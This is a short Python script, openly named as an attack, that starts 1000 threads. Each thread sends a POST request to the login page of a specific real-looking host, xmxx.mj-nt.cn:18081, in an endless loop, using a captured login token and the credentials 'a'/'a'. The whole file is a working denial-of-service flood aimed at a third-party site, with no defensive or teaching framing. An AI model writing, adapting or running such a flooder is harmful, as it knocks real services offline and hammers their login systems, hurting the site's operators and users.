import socket
import threading

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("xmxx.mj-nt.cn", 18081))
            s.send(("POST /login/index.php HTTP/1.1\r\n").encode('ascii'))
            s.send(("Host: " + "xmxx.mj-nt.cn:18081" + "\r\n\r\n").encode('ascii'))
            s.send("anchor=&logintoken=vgeRE6JoWRWzUJE3xKowAGw19xM7eNvS&username=a&password=a".encode('ascii'))
            s.close()
        except Exception as e:
            print(e)

for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()

print("all started")
